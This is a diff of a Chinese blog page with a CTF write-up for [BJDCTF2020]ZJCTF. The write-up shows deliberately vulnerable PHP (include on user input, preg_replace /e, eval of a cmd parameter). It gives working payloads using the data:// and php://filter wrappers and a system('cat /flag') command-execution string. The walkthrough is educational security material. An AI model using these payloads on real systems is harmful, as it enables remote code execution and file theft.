@@ -27,12 +27,12 @@
 
   
   
-    <meta name="description" content="题目源码： 1234567891011121314151617&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)&#x3D;&#x3D;&#x3D;&quot;I hav">
+    <meta name="description" content="题目源码： 1234567891011121314151617&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)&#x3D;&#x3D;&#x3D;&quot;I ha">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[BJDCTF2020]ZJCTF，不过如此">
 <meta property="og:url" content="http://example.com/2025/03/25/[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/index.html">
 <meta property="og:site_name" content="KL">
-<meta property="og:description" content="题目源码： 1234567891011121314151617&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)&#x3D;&#x3D;&#x3D;&quot;I hav">
+<meta property="og:description" content="题目源码： 1234567891011121314151617&lt;?phperror_reporting(0);$text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)&#x3D;&#x3D;&#x3D;&quot;I ha">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-03-25T14:03:49.000Z">
 <meta property="article:modified_time" content="2025-03-29T11:18:00.813Z">
@@ -208,15 +208,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -298,25 +298,33 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <p>题目源码：</p>
+        <p> 题目源码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        die(&quot;Not now!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    include($file);  //next.php</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>这里需要读取text中的内容，且内容必须是 I have a dream</p>
+
+<p>这里需要读取text中的内容，且内容必须是 I have a dream </p>
 <p>这里直接用data伪协议，将 I have a dream 写入一个文本中，然后让file_get_contents来读取</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream</span><br></pre></td></tr></table></figure>
+
 <p>然后后面有个文件包含file</p>
 <p>file不能是有flag，且题目提醒我们了next.php</p>
 <p>我们用php:filter伪协议读取next.php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+
 <p>将内容解码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$_SESSION[&#x27;id&#x27;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, // 构造正则，`e` 修饰符使替换部分可执行代码</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;, // 替换为小写 \\1（匹配的组）</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;    //传入一个键值对,$re=$str</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p>又是一个命令执行</p>
 <p>这里比较难理解的地方是</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, // 构造正则，`e` 修饰符使替换部分可执行代码</span><br><span class="line">        &#x27;strtolower(&quot;\\1&quot;)&#x27;, // 替换为小写 \\1（匹配的组）</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里解题的关键就是preg_replace()+/e存在代码执行漏洞</span><br><span class="line">preg_replace (正则表达式, 替换成什么, 目标字符串, 最大替换次数【默认-1，无数次】, 替换次数)</span><br><span class="line">意思就是就是把（目标字符串） 根据（正则表达的要求） 替换成什么</span><br></pre></td></tr></table></figure>
+
 <p>补充几个php特性的知识点</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">phpinfo能被执行</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo &#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">不能被执行</span><br><span class="line"></span><br><span class="line">这是因为双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。</span><br><span class="line">注意：双引号中的函数不会被执行和替换</span><br></pre></td></tr></table></figure>
+
 <p>再看一个例子</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $&#123;phpinfo()&#125;);</span><br><span class="line">?&gt;</span><br><span class="line">我们可以控制第一个和第三个参数，第二个参数固定为 &#x27;strtolower(&quot;\1&quot;)&#x27; 字符串。使用 strtolower(&quot;\\1&quot;)，它将匹配的内容转换为小写。 我们先看第二个参数中的\1 ，\1实际上就是 \1，而 \1 在正则表达式中有自己的含义，</span><br><span class="line">\1 实际上指定的是第一个子匹配项。而这段代码里面的第一个子匹配项就是$&#123;phpinfo()&#125;。这样我们就执行了phpinfo</span><br><span class="line"></span><br><span class="line">/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）</span><br><span class="line">因此可以通过preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行</span><br></pre></td></tr></table></figure>
+
 <p>payload:</p>
 <p>当非法字符为首字母时，只有点号会被替换成下划线，也使用\s Payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getflag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);	</span><br></pre></td></tr></table></figure>
@@ -406,10 +414,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        91.7k
+        120.8k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        06:19
+        08:20
       </div>
     
     
@@ -454,15 +462,15 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">62</div>
+    <div class="sidebar-state-number">89</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">3</div>
+    <div class="sidebar-state-number">4</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">35</div>
+    <div class="sidebar-state-number">66</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -587,7 +595,7 @@
           url: "http://example.com/2025/03/25/[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/",
           excerpt: "",
           description: "",
-          stripContent: "题目源码： 1234567891011121314151617&amp;lt;?phperror_reporting(0);$text = $_GET[&amp;quot;text&amp;quot;];$file = $_GET[&amp;quot;file&amp;quot;];if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#x27;r&amp;#x27;)===&amp;quot;I have a dream&amp;quot;))&amp;#123;    echo &amp;quot;&amp;lt;br&amp;gt;&amp;l",
+          stripContent: " 题目源码： 1234567891011121314151617&amp;lt;?phperror_reporting(0);$text = $_GET[&amp;quot;text&amp;quot;];$file = $_GET[&amp;quot;file&amp;quot;];if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#x27;r&amp;#x27;)===&amp;quot;I have a dream&amp;quot;))&amp;#123;    echo &amp;quot;&amp;lt;br&amp;gt;&amp;",
           date: "Tue Mar 25 2025 22:03:49 GMT+0800",
           updated: "Sat Mar 29 2025 19:18:00 GMT+0800",
           cover: "/../images/1737907114de8a.jpg",
